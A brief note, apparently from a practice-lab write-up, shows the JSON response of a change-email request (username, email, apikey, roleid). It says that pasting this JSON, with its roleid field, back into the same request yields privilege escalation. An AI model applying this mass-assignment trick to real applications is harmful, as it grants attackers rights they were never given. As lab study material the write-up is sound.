when you 
`POST /my-account/change-email`

you'll receive the following **RESPONSE**: 
```

HTTP/2 302 Found
Location: /my-account
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 126

{
  "username": "wiener",
  "email": "wiener@normal-user.net",
  "apikey": "fL0pxqfRo2QRMtgNFj2tGwY4ZTxloDjx",
  "roleid": 1
}
```

paste the json into the body of the `POST /my-account/change-email` and you have privésque *chefs kiss*
